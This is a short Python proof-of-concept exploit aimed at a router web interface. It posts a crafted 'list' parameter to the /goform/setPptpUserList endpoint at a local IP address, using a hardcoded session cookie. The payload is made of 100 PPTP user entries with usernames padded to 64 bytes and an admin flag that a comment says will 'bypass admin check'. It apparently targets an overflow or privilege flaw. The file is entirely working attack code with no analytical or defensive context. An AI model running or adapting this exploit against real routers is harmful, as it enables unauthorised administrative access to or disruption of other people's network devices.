import requests
cookie = {'Cookie':'SESSION_ID=2:1668665284:2','password': 'caw5gk'}
def gen_user(index):
    username = f"user{index:02d}".ljust(64, 'A')  # Each username is filled with 64 bytes
    password = f"pass{index}"
    uid = str(index)
    admin = "1"  # bypass admin check
    return f"{username};{password};{uid};{admin};x;x;x"

def build_payload(user_count=100):
    return "~" + "~".join([gen_user(i) for i in range(user_count)]) + "~"

def send_exploit(target_url):
    payload = build_payload()
    data = {
        "list": payload
    }

    print(f"[+] Sending payload to {target_url} ...")
    r = requests.post(target_url, data=data,cookies=cookie)
    print(f"[+] Response Status: {r.status_code}")
    print(f"[+] Response Body:\n{r.text}")
# router ip
base_url = "http://192.168.5.12"
set_url = f"{base_url}/goform/setPptpUserList"
try:
    send_exploit(set_url)
except Exception as e:
    print(f'An error  occurred: {e}')

